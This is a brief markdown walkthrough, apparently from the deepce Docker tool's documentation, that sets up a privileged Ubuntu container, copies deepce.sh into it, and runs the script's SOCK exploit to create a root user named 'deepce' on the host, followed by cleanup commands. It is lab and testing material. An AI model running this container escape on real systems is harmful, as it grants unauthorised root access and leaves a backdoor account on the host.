# Setup
A privileged container has the ability to execute commands on the host machine. This allows us to escape the container and execute commands on the host machine as root.

1. Start a privileged container
```
docker run -d -it --name deepce-container-escape1 --privileged ubuntu
```

2. Copy deepce.sh into the container
```
docker cp /opt/deepce/deepce.sh deepce-container-escape1:/deepce.sh
```

# Exploit
- Go inside the container
```
docker exec -it deepce-container-escape1 /bin/bash
```
- Use deepce.sh to exploit the docker sock and create a new root user on the host machine
```
./deepce.sh -e SOCK --username deepce --password deepce
```

# Cleanup
If you wish to remove the new root user after exploitation, shut down the container and delete the user
```
docker stop deepce-container-escape1
docker rm deepce-container-escape1

userdel deepce
```

